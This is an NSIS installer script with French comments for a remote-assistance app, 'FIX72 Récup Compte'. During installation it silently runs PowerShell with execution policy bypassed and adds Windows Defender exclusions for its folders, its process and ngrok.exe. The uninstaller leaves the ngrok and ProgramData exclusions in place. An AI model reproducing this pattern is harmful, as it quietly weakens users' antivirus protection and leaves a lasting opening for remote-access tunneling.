; Personnalisation de l'installeur « FIX72 Récup Compte ».
; Contrairement à l'antivirus, cette app ne pilote pas Windows Defender : on ne
; bloque donc PAS l'installation en présence d'un autre antivirus.
; En revanche on pose les exclusions nécessaires à la prise en main à distance
; (ngrok + dossier de travail), sinon Defender met ngrok en quarantaine et la
; session d'assistance reste bloquée sur « Démarrage en cours ».

!macro customInstall
  DetailPrint "Configuration des exclusions Windows Defender (assistance à distance)..."
  nsExec::ExecToLog "powershell -NoProfile -ExecutionPolicy Bypass -Command $\"try{ Add-MpPreference -ExclusionPath '$INSTDIR' -EA SilentlyContinue; Add-MpPreference -ExclusionPath 'C:\ProgramData\Fix72' -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'FIX72 Recup Compte.exe' -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'ngrok.exe' -EA SilentlyContinue; New-Item -ItemType Directory -Force -Path 'C:\ProgramData\Fix72' | Out-Null }catch{}$\""
  Pop $0
!macroend

!macro customUnInstall
  DetailPrint "Retrait des exclusions Windows Defender..."
  nsExec::ExecToLog "powershell -NoProfile -ExecutionPolicy Bypass -Command $\"try{ Remove-MpPreference -ExclusionPath '$INSTDIR' -EA SilentlyContinue; Remove-MpPreference -ExclusionProcess 'FIX72 Recup Compte.exe' -EA SilentlyContinue }catch{}$\""
  Pop $0
!macroend
